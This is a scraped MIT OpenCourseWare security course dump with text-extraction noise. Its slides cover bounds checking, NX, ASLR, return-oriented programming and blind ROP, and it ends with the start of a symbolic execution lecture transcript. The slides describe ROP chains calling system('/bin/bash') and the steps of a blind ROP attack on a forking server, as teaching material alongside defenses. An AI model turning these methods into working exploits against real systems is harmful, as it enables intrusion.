network	&#13; connection suddenly closes, the guessed address was not	&#13; a stop	&#13; gadget.	&#13; If
the connection	&#13; stays open, the gadget	&#13; is a stop	&#13; gadget.
STEP 2: Find	&#13; gadgets that pop stack entries.
11</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>In essence,	&#13; what we've d
one	&#13; is set	&#13; up a fake	&#13; calling frame for the system() call! In
other	&#13; words,	&#13; we've simulated what the compiler would do if it
actually wanted to
setup a call to system().
What if the string "/bin/bash" was
not in the program
We could include that	&#13; string	&#13; in	&#13; the buf
fer overflow, and then have the argument to
system() point to the string.
| h\0 | ^ 
| - - - - - - - - | |
  
| /bas | | 
| - - - - - - - - | |  
| /bin | | &lt;-------------------+ 
| - - - - - - - - | |  | 
| | | Address of bash_path-+ 
+ - - - - - - - - 
| |  
| | | Junk return addr from 
 +------------------+ |  system() 
entry %esp -&gt; |  return address | | Address of system()  
 +------------------+ | 
new %ebp ---&gt; |  saved %ebp | | Junk 
+
------------------+ | 
| buf[127] | |  
| ... | | Junk | 
buf[0] | | 
new %esp ---&gt; +------------------+ |  
Note that, in these examples, I've
been assuming that the attacker used a junk return	&#13; 
address from system().
However,	&#13; the attacker could set it to something useful. In
fact, by setting it to something useful,	&#13; the attacker can chain calls	&#13; together!
GOAL: We want to call system("/bin/bash")
multiple times. Assume that we've
found	&#13; three	&#13; addresses:
1)The	&#13; address
of system()
2)The	&#13; address	&#13; of the	&#13; string	&#13; "/bin/bash"
3)The	&#13; address	&#13; of these	&#13; x86	&#13; opcodes:
pop %eax	&#13;  //Pops the top -
of-stack and	&#13; puts	&#13; it in %eax
ret //Pops	&#13; t
he	&#13; top -of-stack and	&#13; puts	&#13; it in %eip
These  opcodes  are an example  of a "gadget."  Gadgets are preexisting	&#13; instruction	&#13;  
sequences	&#13;  that can be	&#13;  strung	&#13; 
together	&#13; to	&#13; create	&#13; an	&#13; exploit.	&#13; Note	&#13; that there are user-
friendly tools to help you extract gadgets from  preexisting binaries  (e.g. msfelfscan).
9</text>
        </slide>
        <slide>
          <slideno>13</slideno>
          <text>o	 Interesting,	&#13; Windows is vulnerable	&#13; to	&#13; BROP because Windows has no 
fork()	&#13; equivalent. 
	 Sleep-on-crash? 
o	 Now a BROP	&#13; attack is a denial -of-service!  
	 Bounds-checking?
 
o	 Up to 2x performance overhead . . . 
More info on	&#13; ROP and x86
calling	&#13; conventions:
	 http://www.slideshare.net/saumilshah/dive -into-rop-a-quick-introduction-to 
return-oriented-programming
	 https://cseweb.ucsd.edu/~hovav/dist/rop.pdf 
14</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>Can't detect out -of-bounds pointers ge nerated in uninstrumented code.
 Can't detect when OOB pointer	&#13; passed	&#13; into	&#13; library	&#13; goes in-bounds again.
o	 Q: Why?
o	 A: Because
there is no pointer inspection in the uninstrumented
code
which could clear th
ehigh-order	&#13; OOB bit!
o	 Q: Why do they instrument strcpy() and memcpy()?
o	 A:	&#13; Because	&#13; otherwise,	&#13; t
hose	&#13; functions	&#13; are uninstrumented code, and
suffer from the same problems that we just
discussed. For example
off-the-shelf	&#13; strcpy()	&#13; does not ensure	&#13; that dest has	&#13; enough space	&#13; to	&#13; 
store	&#13; src!
How can baggy	&#13; bits	&#13; leverage	&#13; 64-bit	&#13; address spaces ?
 Can	&#13; get rid of the table storing bounds information, and put it in the pointer.
Regular pointer 
+---------------+------- +------------------------+ 
 
| zero | size | supported addr space |
 
+---------------+-------+------------------------+  
21 5 	 38 
 OOB pointer 
+--------+------+------- +------------------------+ 
 
        | offset | size |  zero | supported addr space | 
+
--------+------+-------+------------------------+  
13 5 8 	 38  
This is similar to a fat pointer, but has the advantages that:
1) tagged	&#13; pointers are the same size as regular pointers
2) writes	&#13; to them are atomic
so programmer expectations are not broken, and data layouts stay the same.
Also note that, using tagged pointers, we can now keep track of OOB pointers that	&#13; go
much further out-of-
bounds.	&#13; This is because now we can tag pointers with an o ffset	&#13; 
indicating	&#13; how far	&#13; they are from their base pointer. In the 32-bit	&#13; wor ld,	&#13; we couldn't
track	&#13; OOB offsets without	&#13; having	&#13; an additional	&#13; data	&#13; structure!
Can	&#13; you still launch a buffer overflow attack in a baggy bounds system? Yes,	&#13; because
the	&#13; world	&#13; is filled	&#13; with	&#13; sadness.
	 Could	&#13; exploit a vulnerability in uninstrumented libraries.
	 Could	&#13; exploit temporal vulnerabilities (use-after-free).
 Mixed buffers and code pointers:
struct { 
void (*f) (void); 
char buf[256];  
} my_type;  
3</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Note	&#13; that *f	&#13; is not an	&#13; allocated	&#13; type,	&#13; so there	&#13; are	&#13; no bounds checks associated with
its	&#13; dereference during invocation.	&#13; Thus, if s.buf	&#13; is overflowed	&#13; (e.g., by	&#13; a bug in	&#13; an
uninstrumented library) and s.f is corrupted, the invocation	&#13; of f will	&#13; not	&#13; cause a
bounds error! 
Would re-ordering	&#13; f and	&#13; buf	&#13; help?
	 Might	&#13; break	&#13; applications that	&#13; depend on	&#13; struct	&#13; layout.
 Might not help if this is an array of (struct my_type)'s
In general,	&#13; what are	&#13; the costs of bounds checking?
	 Space
overhead	&#13; for bounds information (fat pointer or baggy bounds table).
	 Baggy bounds also
has space overhead for extra padding memory used by buddy
allocator (although some amount of overhead is intrinsic to all
popular
algorithms for dynamic memory allocation).
	 CPU over heads	&#13; for pointer arithmetic, dereferencing.
	 False alarms!
o	 Unused out -of-bounds
pointers .
o	 Temporary out-of-bounds	&#13; pointers by more than slot_size/2.
o	 Conversion	&#13; from
pointer to integers and back.
o	 Passing out -of-bounds pointe
r i nto unchecked code (the	&#13; hi gh	&#13; address	&#13; bit
is set,	&#13; so if the	&#13; unchecked code does arithmetic using that pointer,	&#13; 
insanity may ensue).
 Requires a significant amount of compiler support
So, baggy bounds checking is an approach for mitigating buffer overflows	&#13; in
buggy	&#13; 
code.
Mitigation approach 3: non-executable	&#13; memory (AMD's NX bit, Windows
DEP, W^X, ...)
	 Modern hardware allows specifying read, write, and execute perms for memory
(R, W permissions were there a long time ago; execute is recent.)

	 Can	&#13; mark the stack non-executable,	&#13; so th at	&#13; adversary	&#13; cannot	&#13; run their c ode.
	 More generally, some systems enforce "W^X", meaning all memory is either	&#13; 
writable,	&#13; or executable,	&#13; but
not	&#13; both.	&#13; (Of course,	&#13; it's OK to be neither.)
o	 Advantage: Potentially works without any application changes.
o	 Advantage: The hardware is watching
you all of the time, unlike the OS.
o
	 Disadvantage: Harder	&#13; to dynamically generate code (esp. with W^X).
JITs like
Java runtimes, Javascript engines, generate x86 on	&#13; the fly.
Can work a
round	&#13; it, by	&#13; first writing, then changing to executable.
Mitigation approach 4: randomized memory addresses (ASLR, stack
randomization, ...
4</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>7) By	&#13; iteratin g	&#13; through	&#13; the Dictionary,	&#13; the attacker can determine
where the string	&#13; object	&#13; lives by seeing which integers the object	&#13; 
reference	&#13; falls	&#13; between!
8) Now,	&#13; overwrite	&#13; a code pointer	&#13; with	&#13; the	&#13; shellcode address and
bypass ASLR!
	 Adversary might not
care exactly where to jump.
o	 Ex: "Heap	&#13; spraying": fill memory w/ shellcode so that a random jump is
OK!
	 Adversary might exploit some code that's not randomized (if such code
exists).
	 Some other interesting uses of randomization:
o	 System call
randomization (each process has its	&#13; own	&#13; system call
numbers).
o	 Instruction set randomization so that attacker cannot easily determine
wh
at	&#13; "she
llcode"	&#13; looks like for a particular program instantiation.
o	 *Ex: Imagine that the processor had a special register	&#13; to	&#13; hold	&#13; a "decoding
ke
y."	&#13; Each installation of a particular	&#13; application	&#13; is associated	&#13; with	&#13; a
random key. Each machine instruction in the application is XOR'ed	&#13; with	&#13; 
this key.	&#13; When	&#13; the OS launches the process,	&#13; it sets the decoding	&#13; ke
register, and	&#13; the processor uses this key to decode	&#13; instructions before
executing them.
Which buffer overflow	&#13; defenses are used in	&#13; practice?
	 gcc and MSVC enable stack canaries	&#13; by default.
	 Linux and Windows include ASLR and NX by default.
	 Bounds checking is not as common, due to:1) Performance	&#13; overheads
2) Need	&#13; to	&#13; recompile program
3) False	&#13; alarms: Common	&#13; theme in security
tools: false alarms preven
adoption	&#13; of tools! Often,	&#13; zero false alarms with some misses better than
zero misses but false alarms.
RETURN
-ORIENTED PROGRAMMING	&#13; (ROP)
ASLR and DEP are very powerful defensive techniques.
	 DEP prevents the attacker from executing stack code
of his or her choosing
	 ASLR prevents the attacker from determining where shellcode or ret
urn	&#13; 
addresses are
located.
	 However, what if the	&#13; attacker	&#13; could	&#13; find	&#13; PREEXISTING	&#13; CODE with KNOWN
FUNCTIONALITY	&#13; that was located at a KNOWN LOC
ATION?	&#13; Then, the	&#13; attacker	&#13; 
could	&#13; invoke	&#13; that code to	&#13; do evil.
o	 Of course,	&#13; the preexisting	&#13; code isn't	&#13; *intentionally* evil,	&#13; since it is a
normal part of the application.
o	 However,
the	&#13; attacker	&#13; can pass	&#13; that code unexpected arguments, or jum
to the middle of the code and only	&#13; execut
e	&#13; a desired piece of that code.
6</text>
        </slide>
        <slide>
          <slideno>12</slideno>
          <text>| ... | | Junk 
new %esp ------&gt; | buf[0] | | 
+------------------+ |  
So, at the end of this chain, the pop gadgets have placed the syscall number for
pause()	&#13; in a bunch of registers,	&#13; hopefully	&#13; including	&#13; rax,	&#13; which	&#13; is the one that
syscall()	&#13; looks	&#13; in to	&#13; find the	&#13; the	&#13; syscall number.
Once this m ega-gadget	&#13; induces a pause, we know that we've determined the
locatio
n	&#13; of syscall().	&#13; Now	&#13; we need to determine which gadget pops the top-of-the
stack into	&#13; rax.	&#13; The attacker	&#13; can	&#13; figure	&#13; this	&#13; out by process-of-elimination:	&#13; iterativel
try just	&#13; one gadget and s ee	&#13; if you can	&#13; invoke	&#13; pause().
To identify	&#13; arbitrary	&#13; "pop x;	&#13; ret"	&#13; gadgets,	&#13; you can use tricks with other system calls
that	&#13; use the x r
egister that	&#13; you're trying	&#13; to find.
So, the outcome of this phase is knowledge of "pop x; ret"	&#13; gadgets, location of
syscall().
STEP 4: Invoke wr
ite()
Now we	&#13; want to	&#13; invoke	&#13; the	&#13; 
write	&#13; call on the	&#13; network socket that the	&#13; server has	&#13; with	&#13; 
the attacker's client.	&#13; We	&#13; need the	&#13; following	&#13; gadgets:
pop rdi; ret (socket) 
pop rsi; ret (buffer) 
pop rdx; ret (length) pop rax; ret (write syscall number) 
syscall  
We have to guess the socket	&#13; value,	&#13; but that's fairly	&#13; easy	&#13; to	&#13; do, since Linux rest
 ricts	&#13; 
processes to 1024 simultaneously open file descriptors, and new	&#13; file descriptors
have	&#13; to	&#13; be	&#13; the	&#13; lowest one available (so guessing a small file descriptor works well	&#13; in	&#13; 
practice).
To test whether	&#13; we've	&#13; guessed the	&#13; correct file descriptor, simply try the write and
see if we receive anyt
hing!	&#13; 
Once we have the socket number, we issue a write, and for the da ta	&#13; to send . . . we
send a pointer to the program's .text segment! This allows the attacker to read the
program's code (which was randomized but now totally known to the attacker!)
Now the attacker can find more powerful gadgets directly,	&#13; and	&#13; leverage	&#13; those	&#13; 
gadgets to open a shell.
Defenses	&#13; against BROP
	 Re-randomize	&#13; the canaries and the address space after each crash! 
o	 Use ex
ec()	&#13; instead	&#13; of fork()	&#13; to	&#13; create processes,	&#13; since	&#13; fork()	&#13; copies the 
add
ress space	&#13; of the	&#13; parent to	&#13; the	&#13; child. 
13</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>that	&#13; there's no way to statically determine bounds on their values. Such unsafe	&#13; 
variables	&#13; need
checks.
Handling	&#13; function call arguments is a bit tricky, because the x86 calling	&#13; convention	&#13; 
is fixed,	&#13; i.e., the	&#13; hardware expects	&#13; certain	&#13; things	&#13; to	&#13; be	&#13; in certain	&#13; places on the stack.
However,	&#13; we can copy unsafe arguments to a separate area, and make sure that the
copied arguments are aligned and protected.
Q:Do we have to overwrite the original arguments with the copies values upon	&#13; 
function	&#13; return?
 A: No, because	&#13; everything is pass-by-value	&#13; in C!
How	&#13; does baggy bounds checking ensure binary compatibility with exis
ting	&#13; 
libraries?	&#13; In particular,	&#13; how	&#13; does baggy bounds code interact with	&#13; pointers	&#13; to	&#13; 
memory that was allocated by uninstrumented code?
Solution: Each	&#13; entry	&#13; in the	&#13; bounds	&#13; table	&#13; is initialized to the value 31, meaning that
the corresponding pointer has a memory bound of 2^31 (which is all of the
addressable memory). On memory allocation in *instrumented* code, bounds
entries	&#13; are	&#13; set as	&#13; previously	&#13; discussed, and reset to 31 when the memory is
deallocated. Memory allocated to uninstrumented code will never change bounds	&#13; 
table entries from their default values of 31; so, when instrumented code interactswith those pointers,	&#13; bound errors will	&#13; never happen.
Example:
Contiguous	&#13; range	&#13; of memory used for the heap
+-------------------+  
| | 
| | 
| Heap allocated by | | uninstrumented 
|---+  
| code | \ Bounds table 
 | | \  
+
-------------------+      \ +-----------+  
| | +-&gt;|  | 
| | | Always 31 | 
| Heap allocated by | | | 
| instrumented code | +-----------+  
| | | Set using | 
| |---------&gt;| baggy bnds| 
+-------------------+  +-----------+  
What	&#13; does this all mean?
2</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>| | ^ 
+ - - - - - - + | 
| | | Address of bash_path - + Fake calling  
+ - -
- - - - + | | frame for 
(4) 	| | | Address of pop/ret -+ system()  
+ - - - - - - + |  
(3) 	| | | Address of system() 
+ - -
- - - - + |  
(2) 	| | | Address of bash_path -+ Fake calling  
+ - - -
- - -+ | | frame for 
(1) 	| | | Address of pop/ret -+ system()  
+--------------+ | 
entry %esp
-&gt; |return address| | Address of system() 
+--------------+ |  
new %ebp --&gt; | saved %ebp | | Junk 
+----------- ---+ | 
| buf[127] 
| | 
| ... | | Junk 
new %esp --&gt; | 	 buf[0] | | 
+--------------+ |  
So, how does this work? Remember that the return instruction pops the top of the
stack and	&#13; puts	&#13; it into	&#13; %eip.
1) The	&#13; overflowed function terminates by issuing ret. Ret pops off the top -of-
the-stack	&#13; (the address of system()) andsets %eip to it. system() starts
executing,	&#13; and %esp is now
at (1), and	&#13; points	&#13; to	&#13; the	&#13; pop/ret gadget.
2) system()	&#13; finishes execution and calls ret. %esp goes from (1)--&gt;(2)	&#13; as	&#13;  the	&#13; ret 
instruction	&#13; pops the	&#13; top of the	&#13; stack and	&#13; assigns	&#13; it to	&#13; %eip. %eip is now the
start of the	&#13; pop/ret gadget.
3) The	&#13; pop instruction	&#13; in the	&#13; pop/ret gadget discards	&#13; the bash _path variable 
from the stack. %esp is now at (3). We are still	&#13; in	&#13; the pop/ret	&#13; gadget!
4) The	&#13; ret instruction	&#13; in the	&#13; pop/ret gadget pops the top-of-the-stack and	&#13; puts 
it	&#13; into %eip.	&#13; Now	&#13; we're in system() again, and %esp is (4).
And so on and so forth. Basically, we've created a new type of machine that is driven
by the stack	&#13; pointer ins
tead of the regular instruction pointer! As the stack pointe
moves down the stack,	&#13; it executes gadgets whose code comes from preexisting	&#13; 
program code, and whose data comes from stack data created	&#13; by	&#13; the	&#13; buffer	&#13; 
overflow. This attack evades	&#13; DEP protections --we're not	&#13; generating any new	&#13; code,	&#13; 
just invoking preexisting	&#13; code!
Stack reading:	&#13; de feating	&#13; canaries
Assumptions
1) The	&#13; remote server has a buffer overflow
vulnerability.
2) Server crashes	&#13; and
restarts	&#13; if a canary	&#13; value	&#13; is set to an incorrect	&#13; value. 
3) When	&#13; the server respawns,	&#13; the canary is NOT re -randomized,	&#13; and the ASLR 
is NOT	&#13; re-randomized,	&#13; e.g.,	&#13; because the server uses Linux's PIE mechanism,
and fork() is
used to make new workers and not execve().
So, to determine an 8-byte canary value:
10</text>
        </slide>
        <slide>
          <slideno>11</slideno>
          <text>Once you	&#13; have a stop	&#13; gadget,	&#13; you	&#13; can use it	&#13; to f ind other	&#13; gadgets	&#13; that pop entries	&#13; off
of the	&#13; stack and into	&#13; registers. There are	&#13; three	&#13; building	&#13; blocks	&#13; to	&#13; locate	&#13; stack
popping gadgets:
 probe: Address of a potential stack popping gadget 
 stop: Address of a stop gadget 
 crash: Address of non-executable	&#13; code	&#13; (0x0) 
Example: Find a gadget that pops one thing off the stack.
sleep(10) 
^ ^  
+--- pop rax  / \  
| ret / \  
| \---&gt;[stop]  0x5.... 0x5....  
| [trap] 0x0 0x0 &lt;-----------------
+  
+----------[probe] 0x4...8  0x4...c --&gt;xor rax, rax | Crash! 
ret | 
\__________|  
After you do this a bunch of times, you'll have a collection	&#13; of gadgets	&#13; that pop one
thing from the stack and	&#13; then	&#13; return.	&#13; However,	&#13; you won't know which *register*	&#13; 
those gadgets store the popped value in. You	&#13; need to know	&#13; which registers are used
to store data so that you can	&#13; issue	&#13; a sy stem	&#13; call. Each system call expects	&#13; its	&#13; 
arguments to be in a specific set of registers.
Note	&#13; that we	&#13; also	&#13; don't know the	&#13; location	&#13; of the syscall()	&#13; library	&#13; function.
STEP 3: Find syscall() and determine which registers the pop gadgets use
pause()	&#13; is a system call that takes no arguments
(and thus ignores everything	&#13; in	&#13; the
registers). To find pause(),	&#13; the	&#13; attacker	&#13; chains	&#13; all of the "pop x; ret"	&#13; gadgets on the
stack,	&#13; pushing	&#13; the system call number for pause() as the "argument" for each	&#13; 
gadget. At the bottom of the chain, the attacker places the guessed address for
syscall().
| | ^ 
+ - - - - - - - - + |  
| | | Guessed addr of syscall() 
+ - - - - - - - - + |  
| | | ... 
+ - - - - - - - - + |  
| | | Sys call # for pause 
+ - - - - - - - - + |  
| | | Address of pop rsi; ret //Gadget 2 
+ - - - - - - - - + |  
| | | Sys call # for pause 
+------------------+ | 
entry %esp ----&gt; | return address | | Address of pop rdi; ret //Gadget 1 
+------------------+ |  
new %ebp ------&gt; | saved %ebp | | Junk 
+------------------+ | 
| buf[127] | |  
12</text>
        </slide>
        <slide>
          <slideno>14</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858  Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.
15</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>Observation: Many attacks use hardcoded addresses in	&#13; shellcode! [The attacker
grabs	&#13; a binary	&#13; and uses gdb to figure	&#13; out where stuff	&#13; lives.]
	 So, we can make it difficult for the	&#13; attacker	&#13;  to	&#13; guess	&#13; a valid code pointer. 
o	 Stack randomization: Move stack to random locations, and/or place
padding between stack variables. This makes it more difficult for
 
attackers to determine: 
Where the return	&#13; address for the current	&#13; f rame	&#13; is located
Where the attacker
's shellcode buffer will	&#13; be located
o	 Randomize entire address space (Address Space Layout Randomization):
randomize the stack, the heap,
location of DLLs, etc. 
Rely on the fact that a lot of code
is relocatable.
Dynamic loader can choose random address for each library,	&#13; 
program.
Adversary doesn't know address of system(), etc.
o	 Ca
n this	&#13; still be	&#13; exploited? 
Adversary might guess randomness. Especially on 32-bit
machines, there aren't
many random bits (e.g., 1 bit belongs to
kernel/user
mode divide, 12 bits can't be randomized because
memory-mapped pages need to be aligned with page boundaries,	&#13; 
etc.).
For example, attacker could buffer overflow and try to overwrite
the return	&#13; address with the address of usleep(16),	&#13; and then	&#13; s eeing	&#13; 
if the connection	&#13; hangs for 16 seconds, or if it crashes (in	&#13; which	&#13; 
case the server forks a new ASLR process with the same ASLR
offsets). usleep() could be in	&#13; one of 2^16 or 2^28 places. [Mor
details: https://cseweb.ucsd.edu/~hovav/dist/asrandom.pdf ]
o ASLR is more practical on 64-bit machines (easily 32 bits of randomness). 
 -Adversary might extract randomness. 
o	 Programs might generate a stack trace or error message which contains a 
pointer. 
o	 If adversaries can run some code, they might be able to extract real 
address
es (JIT'd code?). 
o	 Cute	&#13; address	&#13; leak in Flash's	&#13; Dictionary	&#13; (hash	&#13; table): 
1) Get	&#13; victim to visit your Flash-enabled	&#13; page	&#13; (e.g.,
buyan ad). 
2) Hash	&#13; table internally computes hash value of keys.
3) Hash	&#13; value	&#13; of integers	&#13; is the	&#13; integer. 
4) Hash	&#13; value	&#13; of object	&#13; is its memory address. 
5) Iterating	&#13; over a hash table is done from lowest hash	&#13; key	&#13; to	&#13; highest
hash	&#13; key. 
6) So,	&#13; the attacker creates	&#13; a Dictionary,	&#13; inserts	&#13; a string	&#13; object which 
has	&#13; shellcode,	&#13; and	&#13; t
hen	&#13; inserts a bunch of numbers into the 
Dictionary. 
5</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-9-securing-web-applications/</video_url>
          <video_title>Lecture 9: Securing Web Applications</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>MIT IS&amp;T</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/http://ist.mit.edu/</lecture_pdf_url>
      <lectureno>22</lectureno>
      <slides/>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-10-symbolic-execution/</video_url>
          <video_title>Lecture 10: Symbolic Execution</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:27</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: All right.</text_slice>
            </slice>
            <slice>
              <time_slice>0:28</time_slice>
              <text_slice>So good morning, everyone.</text_slice>
            </slice>
            <slice>
              <time_slice>0:29</time_slice>
              <text_slice>I'm Armando Solar-Lezama.</text_slice>
            </slice>
            <slice>
              <time_slice>0:32</time_slice>
              <text_slice>I'm giving the lecture
today on symbolic execution.</text_slice>
            </slice>
            <slice>
              <time_slice>0:37</time_slice>
              <text_slice>How many of you here are
familiar with what the term is</text_slice>
            </slice>
            <slice>
              <time_slice>0:41</time_slice>
              <text_slice>or have heard about it before?</text_slice>
            </slice>
            <slice>
              <time_slice>0:45</time_slice>
              <text_slice>We want to get a
sense of audience.</text_slice>
            </slice>
            <slice>
              <time_slice>0:47</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>0:48</time_slice>
              <text_slice>So let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>0:58</time_slice>
              <text_slice>I dropped this machine
a little too many times</text_slice>
            </slice>
            <slice>
              <time_slice>1:00</time_slice>
              <text_slice>and it takes a while to boot up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04</time_slice>
              <text_slice>So symbolic execution
is really the workhorse</text_slice>
            </slice>
            <slice>
              <time_slice>1:10</time_slice>
              <text_slice>of modern program analysis.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14</time_slice>
              <text_slice>It's one of those techniques
that has really broken out</text_slice>
            </slice>
            <slice>
              <time_slice>1:17</time_slice>
              <text_slice>of the research bubble
and actually made it</text_slice>
            </slice>
            <slice>
              <time_slice>1:21</time_slice>
              <text_slice>into a very large number of
high impact applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25</time_slice>
              <text_slice>For example, today
at Microsoft there's</text_slice>
            </slice>
            <slice>
              <time_slice>1:29</time_slice>
              <text_slice>a system called SAGE that runs
on a lot of important Microsoft</text_slice>
            </slice>
            <slice>
              <time_slice>1:35</time_slice>
              <text_slice>code ranging from
PowerPoint to Windows</text_slice>
            </slice>
            <slice>
              <time_slice>1:37</time_slice>
              <text_slice>to actually find security
problems and security</text_slice>
            </slice>
            <slice>
              <time_slice>1:40</time_slice>
              <text_slice>vulnerabilities.</text_slice>
            </slice>
            <slice>
              <time_slice>1:42</time_slice>
              <text_slice>There's a lot of that
academic projects that</text_slice>
            </slice>
            <slice>
              <time_slice>1:44</time_slice>
              <text_slice>have made a lot of
real world impact</text_slice>
            </slice>
            <slice>
              <time_slice>1:48</time_slice>
              <text_slice>by discovering important
bugs in open source software,</text_slice>
            </slice>
            <slice>
              <time_slice>1:51</time_slice>
              <text_slice>for example, by relying
on symbolic execution.</text_slice>
            </slice>
            <slice>
              <time_slice>1:55</time_slice>
              <text_slice>And the beauty of symbolic
execution as a technique</text_slice>
            </slice>
            <slice>
              <time_slice>1:59</time_slice>
              <text_slice>is that compared to
testing, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>2:03</time_slice>
              <text_slice>it gives you the
ability to reason</text_slice>
            </slice>
            <slice>
              <time_slice>2:04</time_slice>
              <text_slice>about how your program
is going to behave</text_slice>
            </slice>
            <slice>
              <time_slice>2:07</time_slice>
              <text_slice>on a potentially infinite
set of possible inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>It allows you to
explore spaces of inputs</text_slice>
            </slice>
            <slice>
              <time_slice>2:15</time_slice>
              <text_slice>that would be completely
unfeasible and impractical</text_slice>
            </slice>
            <slice>
              <time_slice>2:18</time_slice>
              <text_slice>to explore by, say,
random testing,</text_slice>
            </slice>
            <slice>
              <time_slice>2:21</time_slice>
              <text_slice>or even by having a very
large number of testers</text_slice>
            </slice>
            <slice>
              <time_slice>2:25</time_slice>
              <text_slice>banging and the code.</text_slice>
            </slice>
            <slice>
              <time_slice>2:27</time_slice>
              <text_slice>On the other hand, compared
to more traditional</text_slice>
            </slice>
            <slice>
              <time_slice>2:29</time_slice>
              <text_slice>static analysis techniques
it has the advantage</text_slice>
            </slice>
            <slice>
              <time_slice>2:32</time_slice>
              <text_slice>that when it discovers a
problem it can actually</text_slice>
            </slice>
            <slice>
              <time_slice>2:36</time_slice>
              <text_slice>produce for you an
input and a trace</text_slice>
            </slice>
            <slice>
              <time_slice>2:39</time_slice>
              <text_slice>that you can run on
your real program</text_slice>
            </slice>
            <slice>
              <time_slice>2:42</time_slice>
              <text_slice>and execute that
program on that input.</text_slice>
            </slice>
            <slice>
              <time_slice>2:44</time_slice>
              <text_slice>And you can actually tell
that it is a real bug.</text_slice>
            </slice>
            <slice>
              <time_slice>2:48</time_slice>
              <text_slice>And you can actually
go and debug it</text_slice>
            </slice>
            <slice>
              <time_slice>2:49</time_slice>
              <text_slice>using traditional
debugging mechanisms.</text_slice>
            </slice>
            <slice>
              <time_slice>2:55</time_slice>
              <text_slice>And this is
particularly valuable</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>when you're in an industrial
development environment</text_slice>
            </slice>
            <slice>
              <time_slice>3:02</time_slice>
              <text_slice>where you probably
don't have time</text_slice>
            </slice>
            <slice>
              <time_slice>3:04</time_slice>
              <text_slice>to go looking after every
little problem in your code.</text_slice>
            </slice>
            <slice>
              <time_slice>3:08</time_slice>
              <text_slice>You really want
to be able to tell</text_slice>
            </slice>
            <slice>
              <time_slice>3:10</time_slice>
              <text_slice>the difference
between real problems</text_slice>
            </slice>
            <slice>
              <time_slice>3:12</time_slice>
              <text_slice>versus false
positives, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>3:16</time_slice>
              <text_slice>So how does it work?</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>So in order to
really understand how</text_slice>
            </slice>
            <slice>
              <time_slice>3:23</time_slice>
              <text_slice>it works it's useful to
start by looking at just</text_slice>
            </slice>
            <slice>
              <time_slice>3:28</time_slice>
              <text_slice>normal execution, right?</text_slice>
            </slice>
            <slice>
              <time_slice>3:30</time_slice>
              <text_slice>If we think of
symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>3:32</time_slice>
              <text_slice>as a generalization of
traditional, plain execution,</text_slice>
            </slice>
            <slice>
              <time_slice>3:36</time_slice>
              <text_slice>it makes sense to know
what this looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>3:40</time_slice>
              <text_slice>So I'm going to be using this
very, very simple program</text_slice>
            </slice>
            <slice>
              <time_slice>3:44</time_slice>
              <text_slice>as an illustration for
a lot of what I'm going</text_slice>
            </slice>
            <slice>
              <time_slice>3:48</time_slice>
              <text_slice>to be talking about today.</text_slice>
            </slice>
            <slice>
              <time_slice>3:49</time_slice>
              <text_slice>So what do we have here?</text_slice>
            </slice>
            <slice>
              <time_slice>3:51</time_slice>
              <text_slice>Again, it's a very simple
piece of code, just</text_slice>
            </slice>
            <slice>
              <time_slice>3:54</time_slice>
              <text_slice>a couple of branches and
here we have an assertion,</text_slice>
            </slice>
            <slice>
              <time_slice>3:57</time_slice>
              <text_slice>assert false.</text_slice>
            </slice>
            <slice>
              <time_slice>3:58</time_slice>
              <text_slice>And we want to know could that
assertion ever be triggered.</text_slice>
            </slice>
            <slice>
              <time_slice>4:01</time_slice>
              <text_slice>Is it possible?</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>Is there some input where that
will make that assertion fail?</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>And in this case because the
assertion is just saying,</text_slice>
            </slice>
            <slice>
              <time_slice>4:09</time_slice>
              <text_slice>assert false, what
I'm really asking is,</text_slice>
            </slice>
            <slice>
              <time_slice>4:11</time_slice>
              <text_slice>is there an input that can
reach that point in the program?</text_slice>
            </slice>
            <slice>
              <time_slice>4:14</time_slice>
              <text_slice>So one of the things I can
do is I can try just testing.</text_slice>
            </slice>
            <slice>
